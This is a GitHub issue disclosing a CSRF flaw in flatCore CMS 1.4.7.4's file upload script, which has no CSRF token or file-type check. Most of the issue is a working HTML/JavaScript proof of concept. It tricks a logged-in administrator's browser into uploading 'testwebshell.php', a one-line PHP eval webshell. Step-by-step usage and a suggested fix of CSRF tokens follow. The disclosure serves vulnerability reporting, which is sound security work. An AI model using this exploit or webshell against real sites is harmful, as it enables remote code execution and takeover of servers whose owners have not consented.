## Description

![@4rog](https://avatars.githubusercontent.com/u/42081938?u=e1531db40eec7881411ecbaaaec17f0502f7e92b&v=4&size=48)[4rog](https://github.com/4rog)opened [on May 26, 2019](https://github.com/flatCore/flatCore-CMS/issues/39#issue-448574037)

**Title:** CSRF Vulnerability in files.upload-script.php on FlatCore

**Date:** 26-May-2019

**Discovered by:** @Satuer from ABT Labs

**Security:** high (will cause the webshell to upload)

**Software:** <https://github.com/flatCore/flatCore-CMS/archive/1.4.7.4.zip>

**Code:** files.upload-script.php

There is no csrf check, only have a administrator check.(Moreover, there is no check on the file type, and did not change the uploaded file name)

[![CatchA365](https://user-images.githubusercontent.com/42081938/58382586-b664f080-7ffe-11e9-8ee5-21884467974c.jpg)](https://user-images.githubusercontent.com/42081938/58382586-b664f080-7ffe-11e9-8ee5-21884467974c.jpg)

**Description:**

Using Cross-Site Request Forgery (CSRF), an attacker can force a user who is currently authenticated with a web application to execute an unwanted action. The attacker can trick the user into loading a page which may send a request to perform the unwanted action in the background.

**Exploit:**

We assume that FlatCore is installed at <http://192.168.62.129/flatCore>. Our target is acp/core/files.upload-script.php which is the page used to upload a new file. The given POC will upload a webshell to the website.

`<html>`

`<!-- CSRF PoC -->`

`<body>`

`<script>`

`function submitRequest()`

`{`

`var xhr = new XMLHttpRequest();`

`xhr.open("POST", "/flatCore/acp/core/files.upload-script.php", true);`

`xhr.setRequestHeader("Accept", "application/json");`

`xhr.setRequestHeader("Accept-Language", "zh-CN,zh;q=0.9");`

`xhr.setRequestHeader("Content-Type", "multipart/form-data; boundary=--------795986992");`

`xhr.withCredentials = "true";`

`var body = "----------795986992\r\n" +`

`"Content-Disposition: form-data; name=\"upload_destination\"\r\n" +`

`"\r\n" +`

`"../content/\r\n" +`

`"----------795986992\r\n" +`

`"Content-Disposition: form-data; name=\"w\"\r\n" +`

`"\r\n" +`

`"600\r\n" +`

`"----------795986992\r\n" +`

`"Content-Disposition: form-data; name=\"h\"\r\n" +`

`"\r\n" +`

`"500\r\n" +`

`"----------795986992\r\n" +`

`"Content-Disposition: form-data; name=\"fz\"\r\n" +`

`"\r\n" +`

`"2800\r\n" +`

`"----------795986992\r\n" +`

`"Content-Disposition: form-data; name=\"unchanged\"\r\n" +`

`"\r\n" +`

`"\r\n" +`

`"----------795986992\r\n" +`

`"Content-Disposition: form-data; name=\"file\"; filename=\"testwebshell.php\"\r\n" +`

`"Content-Type: text/plain\r\n" +`

`"\r\n" +`

`"<?php eval($_REQUEST['parm']);?>\r\n" +`

`"----------795986992--\r\n";`

`var aBody = new Uint8Array(body.length);`

`for (var i = 0; i < aBody.length; i++)`

`aBody[i] = body.charCodeAt(i);`

`xhr.send(new Blob([aBody]));`

`}`

`</script>`

`<form action="#">`

`<input type="submit" value="Submit request" onclick="submitRequest();" />`

`</form>`

`</body>`

`</html>`

Before visit the POC, make sure you are logged in into an administrator account. Then open the HTML file and submit the form. The webshell have been uploaded.

**Screenshots:**

First, administrator login.

Then, administrator visit the malicious webpage.

Attacker visit webshell.

**Suggest:** Check CSRF tokens in all POST request.
